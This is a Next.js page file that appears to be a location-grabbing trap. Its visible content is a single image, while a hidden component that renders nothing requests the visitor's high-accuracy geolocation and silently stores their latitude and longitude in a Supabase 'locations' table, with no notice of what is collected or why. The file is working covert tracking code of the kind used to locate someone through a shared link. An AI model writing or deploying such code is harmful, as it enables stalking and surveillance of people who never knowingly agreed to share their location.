'use client';

import { useEffect } from 'react';
import { supabase } from '../lib/supabaseClient';

const LOCATION_WATCH_MS = 20000;
const GOOD_ENOUGH_ACCURACY_METERS = 25;

function LocationSaver() {
  useEffect(() => {
    if (
      !navigator.geolocation ||
      !process.env.NEXT_PUBLIC_SUPABASE_URL ||
      !process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
    ) {
      return;
    }

    let bestPosition: GeolocationPosition | null = null;
    let saved = false;

    const saveBestPosition = () => {
      if (saved || !bestPosition) {
        return;
      }

      saved = true;
      navigator.geolocation.clearWatch(watchId);

      void supabase.from('locations').insert({
        latitude: bestPosition.coords.latitude,
        longitude: bestPosition.coords.longitude,
      });
    };

    const watchId = navigator.geolocation.watchPosition(
      (position) => {
        if (!bestPosition || position.coords.accuracy < bestPosition.coords.accuracy) {
          bestPosition = position;
        }

        if (position.coords.accuracy <= GOOD_ENOUGH_ACCURACY_METERS) {
          clearTimeout(timeoutId);
          saveBestPosition();
        }
      },
      () => undefined,
      { enableHighAccuracy: true, timeout: LOCATION_WATCH_MS, maximumAge: 0 }
    );

    const timeoutId = setTimeout(saveBestPosition, LOCATION_WATCH_MS);

    return () => {
      clearTimeout(timeoutId);
      navigator.geolocation.clearWatch(watchId);
    };
  }, []);

  return null;
}

export default function Page() {
  return (
    <>
      <img src="https://neostuffs.com/wp-content/uploads/2016/05/rastra.jpg" alt="" />
      <LocationSaver />
    </>
  );
}
